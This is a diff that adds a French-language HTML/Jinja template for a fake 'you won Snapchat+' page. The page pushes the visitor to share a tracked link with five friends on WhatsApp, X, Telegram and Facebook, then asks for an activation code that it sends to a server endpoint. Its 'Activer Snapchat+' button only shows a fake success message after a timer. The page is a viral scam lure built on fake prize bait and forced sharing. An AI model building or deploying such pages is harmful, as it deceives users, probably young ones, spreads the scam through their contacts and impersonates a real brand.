@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Félicitations</title>
+<link rel="icon" href="{{ url_for('static', filename='img/logo.svg') }}" type="image/svg+xml">
+<style>
+  :root { --ink:#111; --muted:#6b7280; --line:#e5e7eb; --err:#e11d48; --ok:#047857; }
+  * { box-sizing:border-box; margin:0; padding:0; -webkit-tap-highlight-color:transparent; }
+  body { min-height:100vh; display:flex; justify-content:center; background:#f4f4f6; font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; color:var(--ink); }
+  .screen { width:100%; max-width:420px; min-height:100vh; background:#fff; display:flex; flex-direction:column; padding:calc(env(safe-area-inset-top) + 40px) 24px calc(env(safe-area-inset-bottom) + 24px); text-align:center; }
+
+  .logo { width:88px; height:88px; margin:0 auto 18px; }
+  .logo svg { width:100%; height:100%; }
+  .tag { display:inline-block; font-size:11px; font-weight:700; letter-spacing:.06em; text-transform:uppercase; color:var(--ok); background:#ecfdf5; border:1px solid #a7f3d0; padding:4px 10px; border-radius:99px; margin-bottom:14px; }
+  h1 { font-size:26px; font-weight:800; }
+  .sub { color:var(--muted); font-size:14px; line-height:1.55; margin:8px 0 26px; }
+  .sub strong { color:var(--ink); }
+
+  .partage { display:grid; grid-template-columns:1fr 1fr; gap:9px; margin-bottom:24px; }
+  .partage button { height:42px; border:1.5px solid var(--line); border-radius:12px; background:#fff; color:var(--ink); font-family:inherit; font-size:13px; font-weight:600; cursor:pointer; transition:border-color .15s; }
+  .partage button:hover { border-color:#111; }
+  .partage button:last-child { grid-column:1 / -1; }
+
+  .bloc { border:1.5px dashed var(--line); border-radius:16px; padding:18px 16px; }
+  .bloc h2 { font-size:14px; font-weight:700; margin-bottom:4px; }
+  .bloc p { font-size:12.5px; color:var(--muted); margin-bottom:12px; }
+  .code-field { display:flex; gap:8px; }
+  .code-field input { flex:1; height:48px; border:1.5px solid var(--line); border-radius:12px; padding:0 12px; font-size:17px; font-weight:700; letter-spacing:.12em; text-transform:uppercase; text-align:center; outline:none; background:#fafafa; color:inherit; font-family:inherit; }
+  .code-field input:focus { border-color:#111; background:#fff; box-shadow:0 0 0 3px rgba(17,17,17,.08); }
+  .code-field input.bad { border-color:var(--err); }
+  .code-field button { height:48px; padding:0 18px; border:0; border-radius:12px; background:#111; color:#fff; font-size:14px; font-weight:700; cursor:pointer; font-family:inherit; }
+  .code-field button[disabled] { opacity:.5; cursor:not-allowed; }
+  .error { color:var(--err); font-size:13px; min-height:17px; margin-top:9px; }
+
+  .debloque .bloc { border-style:solid; border-color:#a7f3d0; background:#f0fdf4; }
+  .debloque .code-field { display:none; }
+  .debloque .error { display:none; }
+  .acces { display:none; }
+  .debloque .acces { display:block; }
+  .acces .btn { width:100%; height:52px; border:0; border-radius:26px; background:#111; color:#fff; font-size:15px; font-weight:700; cursor:pointer; font-family:inherit; margin-top:4px; }
+  .acces .btn[disabled] { opacity:.6; cursor:progress; }
+
+  .note { font-size:11.5px; color:#9ca3af; margin-top:20px; }
+</style>
+</head>
+<body class="{% if debloque %}debloque{% endif %}" data-token="{{ token }}">
+
+<main class="screen">
+  <div class="logo" role="img" aria-label="Logo">
+    <svg viewBox="290 170 620 620" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <path id="crescent" fill-rule="evenodd" d="M601 182a165 165 0 1 0 .01 0ZM570 238a134 134 0 1 0 .01 0Z"/>
+      </defs>
+      <use href="#crescent" fill="#25aae1"/>
+      <use href="#crescent" fill="#0f75bc" transform="rotate(90 600.5 480)"/>
+      <use href="#crescent" fill="#283891" transform="rotate(180 600.5 480)"/>
+      <use href="#crescent" fill="#27235f" transform="rotate(270 600.5 480)"/>
+    </svg>
+  </div>
+
+  <span class="tag">Compte vérifié · {{ identifiant }}</span>
+  <h1>Félicitations !</h1>
+  <p class="sub">Tu as gagné <strong>Snapchat+</strong>.<br>
+     Partage avec 5 amis pour obtenir ton code d'activation.</p>
+
+  <div class="partage">
+    <button type="button" data-reseau="whatsapp">WhatsApp</button>
+    <button type="button" data-reseau="x">X</button>
+    <button type="button" data-reseau="telegram">Telegram</button>
+    <button type="button" data-reseau="facebook">Facebook</button>
+    <button type="button" data-reseau="copie">Copier le lien</button>
+  </div>
+
+  <div class="bloc">
+    <h2 id="titre-bloc">Code d'activation</h2>
+    <p id="aide-bloc">Saisis le code reçu pour débloquer ton accès.</p>
+
+    <div class="code-field">
+      <input id="code" type="text" inputmode="text" autocomplete="off"
+             autocapitalize="characters" spellcheck="false"
+             maxlength="24" placeholder="SNAP-XXXX" aria-label="Code d'activation">
+      <button type="button" id="valider">Valider</button>
+    </div>
+    <p class="error" id="err" role="alert"></p>
+
+    <div class="acces">
+      <button class="btn" type="button" id="activer">Activer Snapchat+</button>
+    </div>
+  </div>
+
+  <p class="note">Lien unique rattaché à ta session.</p>
+</main>
+
+<script>
+  const token = document.body.dataset.token;
+  const champ = document.getElementById('code');
+  const err = document.getElementById('err');
+  const valider = document.getElementById('valider');
+  const activer = document.getElementById('activer');
+
+  function lien() { return `${location.origin}/r/${token}`; }
+
+  const TEXTE = "J'ai gagné Snapchat+ 🎉";
+
+  const URLS = {
+    whatsapp: () => `https://wa.me/?text=${encodeURIComponent(TEXTE)}%20${encodeURIComponent(lien())}`,
+    x: () => `https://twitter.com/intent/tweet?text=${encodeURIComponent(TEXTE)}&url=${encodeURIComponent(lien())}`,
+    telegram: () => `https://t.me/share/url?url=${encodeURIComponent(lien())}&text=${encodeURIComponent(TEXTE)}`,
+    facebook: () => `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(lien())}`
+  };
+
+  document.querySelectorAll('.partage button').forEach((b) => {
+    b.addEventListener('click', async () => {
+      const reseau = b.dataset.reseau;
+
+      if (reseau === 'copie') {
+        try {
+          await navigator.clipboard.writeText(lien());
+          const avant = b.textContent;
+          b.textContent = 'Lien copié';
+          setTimeout(() => (b.textContent = avant), 1600);
+        } catch (_) {
+          err.textContent = lien();
+        }
+        return;
+      }
+
+      if (URLS[reseau]) window.open(URLS[reseau](), '_blank', 'noopener,width=620,height=640');
+    });
+  });
+
+  async function envoyer() {
+    const code = champ.value.trim();
+    if (!code) {
+      err.textContent = "Saisis le code d'activation.";
+      champ.classList.add('bad');
+      champ.focus();
+      return;
+    }
+
+    valider.disabled = true;
+    err.textContent = '';
+    champ.classList.remove('bad');
+
+    try {
+      const res = await fetch(`/api/code/${token}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code })
+      });
+      const data = await res.json();
+
+      if (res.ok && data.ok) {
+        document.body.classList.add('debloque');
+        document.getElementById('titre-bloc').textContent = 'Accès débloqué';
+        document.getElementById('aide-bloc').textContent = 'Ton code est valide. Active ton avantage.';
+        return;
+      }
+      err.textContent = data.erreur || 'Code incorrect.';
+      champ.classList.add('bad');
+      champ.select();
+    } catch (_) {
+      err.textContent = 'Impossible de vérifier le code.';
+    } finally {
+      valider.disabled = false;
+    }
+  }
+
+  valider.addEventListener('click', envoyer);
+  champ.addEventListener('keydown', (e) => { if (e.key === 'Enter') envoyer(); });
+  champ.addEventListener('input', () => champ.classList.remove('bad'));
+
+  activer.addEventListener('click', () => {
+    activer.disabled = true;
+    activer.textContent = 'Activation en cours...';
+    setTimeout(() => { activer.textContent = 'Snapchat+ activé ✓'; }, 1400);
+  });
+</script>
+</body>
+</html>
